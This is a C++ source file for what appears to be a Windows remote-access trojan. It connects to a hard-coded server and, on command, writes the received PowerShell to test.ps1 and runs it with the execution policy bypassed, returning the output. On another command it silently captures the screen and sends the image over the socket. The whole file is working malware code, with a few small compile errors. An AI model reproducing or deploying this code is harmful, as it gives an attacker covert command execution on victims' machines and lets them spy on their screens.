#include <iostream>
#include <ctime>
#include <string>
#include <string.h>
#include <WS2tcpip.h>
#include <cstdlib>
#include <Windows.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <fstream>
#include <gdiplus.h>
#include <Shlwapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "Shlwapi.lib")

using namespace std;

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

void sendScreenshot(SOCKET sock) {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemory = CreateCompatibleDC(hdcScreen);

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

    BitBlt(hdcMemory, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    Gdiplus::Bitmap bitmap(hBitmap, NULL);

    CLSID clsid;
    GetEncoderClsid(L"image/jpeg", &clsid);

    std::wstring fileName = L"screenshot.jpg";
    PathCombineW((LPWSTR)fileName.data(), L".\\", fileName.data());

    bitmap.Save(fileName.c_str(), &clsid, NULL);

    SelectObject(hdcMemory, hBitmapOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMemory);
    ReleaseDC(NULL, hdcScreen);

    Gdiplus::GdiplusShutdown(gdiplusToken);

    std::ifstream file(fileName, std::ios::binary);
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    remove(fileName.c_str());

    int bufferSize = buffer.size();
    send(sock, (char*)&bufferSize, sizeof(bufferSize), 0);
    send(sock, buffer.data(), bufferSize, 0);
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;

    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

void main()
{
    string ipAddress = "127.0.0.1";            // IP Address of the server
    int port = 1337;                        // Listening port # on the server

    // Initialize WinSock
    WSAData data;
    WORD ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &data);
    if (wsResult != 0)
    {
        cerr << "Can't start Winsock, Err #" << wsResult << endl;
        return;
    }

    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
        WSACleanup();
        return;
    }

    // Fill in a hint structure
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

    // Connect to server
    int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
    if (connResult == SOCKET_ERROR)
    {
        cerr << "Can't connect to server, Err #" << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Do-while loop to send and receive data
    char buf[4096];
    char p[] = "power";
    char screenshot[] = "screenshot";
    char e_power[] = "exit_power";
    char e_of_server[] = "exit_of_server";
    string userInput;
    string result = "";

    ZeroMemory(buf, 4096);
    int bytesReceived = recv(sock, buf, 4096, 0);

    while (strcmp(buf, e_of_server) != 0)
    {
        if (bytesReceived > 0)
        {
            if (strcmp(buf, p) == 0)
            {
                while (strcmp(buf, e_power) != 0)
                {
                    ZeroMemory(buf, 4096);
                    int bytesReceived = recv(sock, buf, 4096, 0);

                    if (strcmp(buf, screenshot) == 0)
                    {
                        sendScreenshot(sock);
                    }
                    else
                    {
                        ofstream file;
                        file.open("test.ps1");

                        string newArg = "-auto";
                        string powershell;
                        powershell = buf;

                        file << powershell << endl;
                        file.close();

                        result = exec("powershell -ExecutionPolicy Bypass -F test.ps1");

                        if (result.size() > 0) {
                            remove("test.ps1");

                            int sendResult = send(sock, result.c_str(), result.size(), 0);
                            result = "";
                        }
                        else
                        {
                            result = "It happened";
                            int sendResult = send(sock, result.c_str(), result.size(), 0);
                        }
                    }
                }
            }

            ZeroMemory(buf, 4096);
            int bytesReceived = recv(sock, buf, 4096, 0);
        }
    }

    // Gracefully close down everything
    closesocket(sock);
    WSACleanup();
}
